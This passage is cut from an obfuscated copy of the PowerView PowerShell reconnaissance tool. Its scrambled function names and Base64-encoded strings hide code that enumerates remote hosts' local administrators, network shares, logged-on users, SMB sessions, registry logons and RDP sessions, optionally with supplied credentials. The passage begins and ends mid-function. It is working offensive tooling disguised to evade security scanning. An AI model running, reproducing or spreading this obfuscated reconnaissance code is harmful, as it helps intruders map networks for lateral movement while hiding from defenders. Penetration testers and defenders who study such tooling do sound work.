                    ${___/\__/\_/\_/\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AVwBpAG4ATgBUAA=='))))
                    ${___/\__/\_/\_/\__}
                }
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function _/===\_/\_/\_/==== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = ${Env:____/=\/=\_/=\/\/},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${___/===\/=\___/\/} = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                ${___________/==\__} = 2
                ${/==\_/\_/\/==\___} = [IntPtr]::Zero
                ${_/==\/\__/\__/==\} = 0
                ${/\_____/\/\______} = 0
                ${/=\/\_____/\_/\_/} = 0
                ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::NetLocalGroupGetMembers(${__/\__/\/\_/=====}, ${___/===\/=\___/\/}, ${___________/==\__}, [ref]${/==\_/\_/\/==\___}, -1, [ref]${_/==\/\__/\__/==\}, [ref]${/\_____/\/\______}, [ref]${/=\/\_____/\_/\_/})
                ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
                ${__/====\___/==\_/} = @()
                if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                    ${________/=\/\__/\} = ${_/\/\_/\_____/===}::GetSize()
                    for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${_/==\/\__/\__/==\}); ${/==\__/===\__/\__}++) {
                        ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                        ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${_/\/\_/\_____/===}
                        ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                        ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                        ${_________/\/\____} = ''
                        ${_/\/=====\_/\/==\} = ${/\____/=\/\/=\/\_}::ConvertSidToStringSid(${/=\__/\__/==\/===}.lgrmi2_sid, [ref]${_________/\/\____});${___/\____/\_/====} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${_/\/=====\_/\/==\} -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
                        }
                        else {
                            ${/=\/\/\__/==\____} = New-Object PSObject
                            ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                            ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                            ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${/=\__/\__/==\/===}.lgrmi2_domainandname
                            ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ${_________/\/\____}
                            ${____/==\/\/=\/=\/} = $(${/=\__/\__/==\/===}.lgrmi2_sidusage -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGQAVAB5AHAAZQBHAHIAbwB1AHAA'))))
                            ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${____/==\/\/=\/=\/}
                            ${/=\/\/\__/==\____}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAE0AZQBtAGIAZQByAC4AQQBQAEkA'))))
                            ${__/====\___/==\_/} += ${/=\/\/\__/==\____}
                        }
                    }
                    $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
                    ${/=\_/==\/=\/\_/\_} = ${__/====\___/==\_/} | ? {$_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAA'))) -or ($_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADEA'))))} | select -Expand SID
                    if (${/=\_/==\/=\/\_/\_}) {
                        ${/=\_/==\/=\/\_/\_} = ${/=\_/==\/=\/\_/\_}.Substring(0, ${/=\_/==\/=\/\_/\_}.LastIndexOf('-'))
                        ${__/====\___/==\_/} | % {
                            if ($_.SID -match ${/=\_/==\/=\/\_/\_}) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $True
                            }
                        }
                    }
                    else {
                        ${__/====\___/==\_/} | % {
                            if ($_.SID -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAA==')))) {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $False
                            }
                            else {
                                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                            }
                        }
                    }
                    ${__/====\___/==\_/}
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
                }
            }
            else {
                try {
                    ${/=\_/\_/=\/=\_/\/} = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQAvACQAewBfAF8AXwAvAD0APQA9AFwALwA9AFwAXwBfAF8ALwBcAC8AfQAsAGcAcgBvAHUAcAA=')))
                    ${/=\_/\_/=\/=\_/\/}.psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))) | % {
                        ${/=\/\/\__/==\____} = New-Object PSObject
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                        ${_/=\__/\/====\/\/} = ([ADSI]$_)
                        ${__/=\_/\_/=\_/\__} = ${_/=\__/\/====\/\/}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAHMAUABhAHQAaAA=')))).Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvAA=='))), '')
                        ${____/==\/\/=\/=\/} = (${_/=\__/\/====\/\/}.SchemaClassName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))))
                        if(([regex]::Matches(${__/=\_/\_/=\_/\__}, '/')).count -eq 1) {
                            ${/==\_____/\/\/\__} = $True
                            $Name = ${__/=\_/\_/=\_/\__}.Replace('/', '\')
                        }
                        else {
                            ${/==\_____/\/\/\__} = $False
                            $Name = ${__/=\_/\_/=\_/\__}.Substring(${__/=\_/\_/=\_/\__}.IndexOf('/')+1).Replace('/', '\')
                        }
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Name
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier(${_/=\__/\/====\/\/}.InvokeGet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA')))),0)).Value)
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) ${____/==\/\/=\/=\/}
                        ${/=\/\/\__/==\____} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEQAbwBtAGEAaQBuAA=='))) ${/==\_____/\/\/\__}
                        ${/=\/\/\__/==\____}
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAXQAgAEUAcgByAG8AcgAgAGYAbwByACAAJAB7AF8AXwAvAFwAXwBfAC8AXAAvAFwAXwAvAD0APQA9AD0APQB9ACAAOgAgACQAXwA=')))
                }
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function __/=\_/==\/=\/\_/= {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${___________/==\__} = 1
            ${/==\_/\_/\/==\___} = [IntPtr]::Zero
            ${_/==\/\__/\__/==\} = 0
            ${/\_____/\/\______} = 0
            ${/=\/\_____/\_/\_/} = 0
            ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::NetShareEnum(${__/\__/\/\_/=====}, ${___________/==\__}, [ref]${/==\_/\_/\/==\___}, -1, [ref]${_/==\/\__/\__/==\}, [ref]${/\_____/\/\______}, [ref]${/=\/\_____/\_/\_/})
            ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
            if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                ${________/=\/\__/\} = ${__/==\__/=\/=\___}::GetSize()
                for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${_/==\/\__/\__/==\}); ${/==\__/===\__/\__}++) {
                    ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                    ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${__/==\__/=\/=\___}
                    ${_/==\___/\_/\/===} = ${/=\__/\__/==\/===} | select *
                    ${_/==\___/\_/\/===} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${_/==\___/\_/\/===}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
                    ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                    ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                    ${_/==\___/\_/\/===}
                }
                $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function __/\/=\_/\/=\/==== {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${___________/==\__} = 1
            ${/==\_/\_/\/==\___} = [IntPtr]::Zero
            ${_/==\/\__/\__/==\} = 0
            ${/\_____/\/\______} = 0
            ${/=\/\_____/\_/\_/} = 0
            ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::NetWkstaUserEnum(${__/\__/\/\_/=====}, ${___________/==\__}, [ref]${/==\_/\_/\/==\___}, -1, [ref]${_/==\/\__/\__/==\}, [ref]${/\_____/\/\______}, [ref]${/=\/\_____/\_/\_/})
            ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
            if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                ${________/=\/\__/\} = ${___/=\_/==\/\/\/=}::GetSize()
                for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${_/==\/\__/\__/==\}); ${/==\__/===\__/\__}++) {
                    ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                    ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${___/=\_/==\/\/\/=}
                    ${_/\/\_____/=\_/\_} = ${/=\__/\__/==\/===} | select *
                    ${_/\/\_____/=\_/\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${_/\/\_____/=\_/\_}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZgBvAA=='))))
                    ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                    ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                    ${_/\/\_____/=\_/\_}
                }
                $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function _/===\/==\/\/===\_ {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${___________/==\__} = 10
            ${/==\_/\_/\/==\___} = [IntPtr]::Zero
            ${_/==\/\__/\__/==\} = 0
            ${/\_____/\/\______} = 0
            ${/=\/\_____/\_/\_/} = 0
            ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::NetSessionEnum(${__/\__/\/\_/=====}, '', ${/=\/=\_/\_/\/\_/\}, ${___________/==\__}, [ref]${/==\_/\_/\/==\___}, -1, [ref]${_/==\/\__/\__/==\}, [ref]${/\_____/\/\______}, [ref]${/=\/\_____/\_/\_/})
            ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
            if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                ${________/=\/\__/\} = ${______/=\/\_/\_/=}::GetSize()
                for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${_/==\/\__/\__/==\}); ${/==\__/===\__/\__}++) {
                    ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                    ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${______/=\/\_/\_/=}
                    ${_/\/\___/\_/\__/=} = ${/=\__/\__/==\/===} | select *
                    ${_/\/\___/\_/\__/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                    ${_/\/\___/\_/\__/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                    ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                    ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                    ${_/\/\___/\_/\__/=}
                }
                $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Get-RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            try {
                ${/=======\/\/=\_/=} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8ALwA9AFwALwA9AFwAXwAvAD0AXAAvAFwALwB9AA=='))))
                ${/=======\/\/=\_/=}.GetSubKeyNames() | ? { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | % {
                    ${/=\/=\_/\_/\/\_/\} = _/===\/=\_/\____/\ -__/\_/=\__/=\__/\ $_ -_/=\/=\/==\/\_/=\_ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if (${/=\/=\_/\_/\/\_/\}) {
                        ${/=\/=\_/\_/\/\_/\}, $UserDomain = ${/=\/=\_/\_/\/\_/\}.Split('@')
                    }
                    else {
                        ${/=\/=\_/\_/\/\_/\} = $_
                        $UserDomain = $Null
                    }
                    ${_/\__/\_/\____/==} = New-Object PSObject
                    ${_/\__/\_/\____/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8ALwA9AFwALwA9AFwAXwAvAD0AXAAvAFwALwB9AA==')))
                    ${_/\__/\_/\____/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    ${_/\__/\_/\____/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\/=\_/\_/\/\_/\}
                    ${_/\__/\_/\____/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
                    ${_/\__/\_/\____/==}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA='))))
                    ${_/\__/\_/\____/==}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFIAZQBnAEwAbwBnAGcAZQBkAE8AbgBdACAARQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuACAAJwAkAHsAXwBfAF8AXwAvAD0AXAAvAD0AXABfAC8APQBcAC8AXAAvAH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Get-NetRDPSession {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            ${/=\/=\/\__/=\/=\_} = ${/==\_/=\/===\/\__}::WTSOpenServerEx(${__/\__/\/\_/=====})
            if (${/=\/=\/\__/=\/=\_} -ne 0) {
                ${_/\/==\__/\/===\/} = [IntPtr]::Zero
                ${/==\____/\/\___/\} = 0
                ${/\_____/=\__/==\_} = ${/==\_/=\/===\/\__}::WTSEnumerateSessionsEx(${/=\/=\/\__/=\/=\_}, [ref]1, 0, [ref]${_/\/==\__/\/===\/}, [ref]${/==\____/\/\___/\});${___/\____/\_/====} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                ${__/===\/=\/\__/\/=} = ${_/\/==\__/\/===\/}.ToInt64()
                if ((${/\_____/=\__/==\_} -ne 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                    ${________/=\/\__/\} = ${/===\/\___/\_/===}::GetSize()
                    for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${/==\____/\/\___/\}); ${/==\__/===\__/\__}++) {
                        ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                        ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${/===\/\___/\_/===}
                        ${___/=\____/====\_} = New-Object PSObject
                        if (${/=\__/\__/==\/===}.pHostName) {
                            ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${/=\__/\__/==\/===}.pHostName
                        }
                        else {
                            ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                        }
                        ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${/=\__/\__/==\/===}.pSessionName
                        if ($(-not ${/=\__/\__/==\/===}.pDomainName) -or (${/=\__/\__/==\/===}.pDomainName -eq '')) {
                            ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${/=\__/\__/==\/===}.pUserName)"
                        }
                        else {
                            ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${/=\__/\__/==\/===}.pDomainName)\$(${/=\__/\__/==\/===}.pUserName)"
                        }
                        ${___/=\____/====\_} | Add-Member Noteproperty 'ID' ${/=\__/\__/==\/===}.SessionID
                        ${___/=\____/====\_} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${/=\__/\__/==\/===}.State
                        ${/=\__/==\_____/=\} = [IntPtr]::Zero
                        ${_/\_/\__/=\/\/\/\} = 0
                        ${_/\/=====\_/\/==\} = ${/==\_/=\/===\/\__}::WTSQuerySessionInformation(${/=\/=\/\__/=\/=\_}, ${/=\__/\__/==\/===}.SessionID, 14, [ref]${/=\__/==\_____/=\}, [ref]${_/\_/\__/=\/\/\/\});${/=\/===\/==\/=\_/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${_/\/=====\_/\/==\} -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${/=\/===\/==\/=\_/}).Message)"
                        }
                        else {
                            ${_/=\_/======\/===} = ${/=\__/==\_____/=\}.ToInt64()
                            ${/====\_/\/=\/\_/\} = New-Object System.Intptr -ArgumentList ${_/=\_/======\/===}
                            ${__/=\/\/\/=\__/==} = ${/====\_/\/=\/\_/\} -as ${/==\_/\/\_/\/\/\/}
                            ${__/\/\/\/\_/\/\__} = ${__/=\/\/\/=\__/==}.Address
                            if (${__/\/\/\/\_/\/\__}[2] -ne 0) {
                                ${__/\/\/\/\_/\/\__} = [String]${__/\/\/\/\_/\/\__}[2]+'.'+[String]${__/\/\/\/\_/\/\__}[3]+'.'+[String]${__/\/\/\/\_/\/\__}[4]+'.'+[String]${__/\/\/\/\_/\/\__}[5]
                            }
                            else {
